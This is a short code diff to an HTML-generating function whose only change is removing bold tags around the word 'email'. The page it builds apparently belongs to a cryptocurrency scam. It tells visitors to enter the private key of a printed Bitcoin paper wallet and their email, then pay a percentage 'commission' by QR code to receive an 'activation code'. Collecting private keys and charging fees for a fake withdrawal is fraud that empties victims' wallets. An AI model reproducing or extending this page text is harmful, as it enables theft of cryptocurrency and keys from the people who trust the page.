@@ -94,10 +94,10 @@ async function generateHTML(
             </div>
             <p>To withdraw funds from a paper wallet, you have to pay a commission of ${precent}% of the current Bitcoin wallet
                 amount.</p>
-            <p>First enter the private key from your printed BTC paper wallet and enter your <strong>email</strong> to
+            <p>First enter the private key from your printed BTC paper wallet and enter your email to
                 pay the commission, use a digital Bitcoin wallet, scan the QR code, send the correct amount of Bitcoin
                 indicated on the website form, double-check the Bitcoin address to which the commission needs to be
-                paid. After paying the ${precent}% commission, the activation code will be sent to the <strong>email</strong>.
+                paid. After paying the ${precent}% commission, the activation code will be sent to the email.
             </p>
             <p><strong>IMPORTANT:</strong> The secret private key can only be used once, after which it is no longer
                 valid.</p>
